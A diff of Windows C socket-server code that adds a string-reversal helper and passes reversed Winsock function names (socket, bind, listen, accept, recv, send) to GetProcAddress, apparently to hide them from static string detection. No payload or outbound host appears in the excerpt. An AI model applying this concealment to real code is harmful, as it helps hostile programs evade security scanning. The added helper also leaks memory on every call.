@@ -35,10 +35,25 @@ struct sockaddr_in {
     char sin_zero[8];
 };
 
+char* flip_string(const char* str) {
+    if (str == NULL) return NULL;
+
+    size_t len = strlen(str);
+    char* flipped = (char*)malloc(len + 1); // +1 for null terminator
+    if (flipped == NULL) return NULL; // allocation failure
+
+    for (size_t i = 0; i < len; i++) {
+        flipped[i] = str[len - 1 - i];
+    }
+    flipped[len] = '\0';
+
+    return flipped;
+}
+
 void runServer() {
     HMODULE hWinsock = LoadLibraryA("ws2_32.dll");
     if (!hWinsock) {
-        // printf("Failed to load ws2_32.dll\n");
+        printf("Failed to load ws2_32.dll\n");
         return;
     }
 
@@ -61,20 +76,20 @@ void runServer() {
     typedef int (WSAAPI *LPFN_WSAGETLASTERROR)(void);
 
     // Resolve
-    LPFN_WSASTARTUP pWSAStartup = (LPFN_WSASTARTUP)GetProcAddress(hWinsock, "WSAStartup");
-    LPFN_WSACLEANUP pWSACleanup = (LPFN_WSACLEANUP)GetProcAddress(hWinsock, "WSACleanup");
-    LPFN_SOCKET psocket = (LPFN_SOCKET)GetProcAddress(hWinsock, "socket");
-    LPFN_BIND pbind = (LPFN_BIND)GetProcAddress(hWinsock, "bind");
-    LPFN_LISTEN plisten = (LPFN_LISTEN)GetProcAddress(hWinsock, "listen");
-    LPFN_ACCEPT paccept = (LPFN_ACCEPT)GetProcAddress(hWinsock, "accept");
-    LPFN_RECV precv = (LPFN_RECV)GetProcAddress(hWinsock, "recv");
-    LPFN_SEND psend = (LPFN_SEND)GetProcAddress(hWinsock, "send");
-    LPFN_CLOSESOCKET pclosesocket = (LPFN_CLOSESOCKET)GetProcAddress(hWinsock, "closesocket");
-    LPFN_HTONS phtons = (LPFN_HTONS)GetProcAddress(hWinsock, "htons");
-    LPFN_WSAGETLASTERROR pWSAGetLastError = (LPFN_WSAGETLASTERROR)GetProcAddress(hWinsock, "WSAGetLastError");
+    LPFN_WSASTARTUP pWSAStartup = (LPFN_WSASTARTUP)GetProcAddress(hWinsock, flip_string("putratSASW"));
+    LPFN_WSACLEANUP pWSACleanup = (LPFN_WSACLEANUP)GetProcAddress(hWinsock, flip_string("punaelCASW"));
+    LPFN_SOCKET psocket = (LPFN_SOCKET)GetProcAddress(hWinsock, flip_string("tekcos"));
+    LPFN_BIND pbind = (LPFN_BIND)GetProcAddress(hWinsock, flip_string("dnib"));
+    LPFN_LISTEN plisten = (LPFN_LISTEN)GetProcAddress(hWinsock, flip_string("netsil"));
+    LPFN_ACCEPT paccept = (LPFN_ACCEPT)GetProcAddress(hWinsock, flip_string("tpecca"));
+    LPFN_RECV precv = (LPFN_RECV)GetProcAddress(hWinsock, flip_string("vcer"));
+    LPFN_SEND psend = (LPFN_SEND)GetProcAddress(hWinsock, flip_string("dnes"));
+    LPFN_CLOSESOCKET pclosesocket = (LPFN_CLOSESOCKET)GetProcAddress(hWinsock, flip_string("tekcosesolc"));
+    LPFN_HTONS phtons = (LPFN_HTONS)GetProcAddress(hWinsock, flip_string("snoth"));
+    LPFN_WSAGETLASTERROR pWSAGetLastError = (LPFN_WSAGETLASTERROR)GetProcAddress(hWinsock, flip_string("rorrEtsaLteGASW"));
 
     if (!pWSAStartup || !pWSACleanup || !psocket || !pbind || !plisten || !paccept || !precv || !psend || !pclosesocket || !phtons || !pWSAGetLastError) {
-        // printf("Failed to resolve some Winsock functions.\n");
+        printf("Failed to resolve some Winsock functions.\n");
         FreeLibrary(hWinsock);
         return;
     }
